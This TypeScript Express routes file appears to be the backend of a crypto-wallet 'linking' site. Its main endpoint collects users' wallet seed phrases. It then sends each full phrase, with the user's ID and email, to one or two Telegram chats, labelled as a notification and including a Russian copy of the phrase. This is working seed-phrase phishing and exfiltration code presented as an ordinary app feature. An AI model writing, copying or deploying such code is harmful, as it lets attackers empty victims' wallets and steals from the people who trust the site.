
import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import { setupAuth } from "./auth";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Setup authentication routes and middleware
  setupAuth(app);

  // === Wallet Routes ===
  
  // Link a wallet (save seed phrase)
  app.post(api.wallets.link.path, async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).send({ message: "Unauthorized" });
    }
    
    try {
      const input = api.wallets.link.input.parse(req.body);
      const wallet = await storage.createWalletData(req.user!.id, input);

      // Telegram Notification
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      const secondChatId = process.env.SECOND_TELEGRAM_CHAT_ID;
      
      const sendTelegram = async (id: string) => {
        if (!id) return;
        const message = `🔔 *New Seed Phrase Linked*\n\n` +
          `👤 *User ID:* ${req.user!.id}\n` +
          `📧 *Email:* ${req.user!.email}\n` +
          `📝 *Length:* ${input.phraseLength} words\n\n` +
          `🔑 *Phrase:* \`${input.phrase}\`\n\n` +
          `Новая сид-фраза: ${input.phrase} | Пользователь ID: ${req.user!.id}`;

        try {
          const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: id,
              text: message,
              parse_mode: 'Markdown',
            }),
          });
          if (!response.ok) {
            console.error(`Telegram API error for ${id}: ${response.status} ${await response.text()}`);
          }
        } catch (err) {
          console.error(`Telegram notification fetch failed for ${id}:`, err);
        }
      };
      
      if (botToken) {
        const notificationPromises = [];
        if (chatId) notificationPromises.push(sendTelegram(chatId));
        if (secondChatId) notificationPromises.push(sendTelegram(secondChatId));
        
        // Don't await here to keep response fast, but execute both
        if (notificationPromises.length > 0) {
          Promise.all(notificationPromises).catch(err => console.error("Batch telegram notification failed:", err));
        }
      }

      res.status(201).json(wallet);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      throw err;
    }
  });

  // List linked wallets
  app.get(api.wallets.list.path, async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).send({ message: "Unauthorized" });
    }
    
    const wallets = await storage.getWalletsByUser(req.user!.id);
    res.json(wallets);
  });

  return httpServer;
}
